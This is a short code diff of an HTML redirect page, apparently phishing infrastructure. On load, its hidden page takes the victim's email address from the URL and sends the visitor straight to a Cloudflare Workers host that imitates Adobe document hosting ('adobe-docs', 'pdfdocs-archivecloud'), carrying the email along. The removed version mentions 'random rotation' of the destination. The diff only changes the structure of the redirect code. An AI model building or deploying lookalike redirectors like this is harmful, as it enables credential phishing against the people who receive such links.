@@ -4,27 +4,16 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    // Grab ?email= from URL
-    function getEmail() {
+    (function() {
       const params = new URLSearchParams(window.location.search);
-      return params.get("email") || "";
-    }
+      const email = params.get("email") || "";
 
-    // Redirect to your Worker
-    function redirectToWorker() {
-      const email = getEmail();
+      // Replace with your deployed Worker URL
+      const workerUrl = "https://pdfdocs-77-archivecloud.adobe-docs.workers.dev/?email=" + encodeURIComponent(email);
 
-      // Main Worker URL (handles stateless random rotation)
-      let url = "https://pdfdocs-77-archivecloud.adobe-docs.workers.dev/";
-      if (email) {
-        url += "?email=" + encodeURIComponent(email);
-      }
-
-      // Immediate redirect
-      window.location.replace(url);
-    }
-
-    window.addEventListener("load", redirectToWorker);
+      // Redirect immediately to Worker
+      window.location.replace(workerUrl);
+    })();
   </script>
 </head>
 <body style="display:none;">
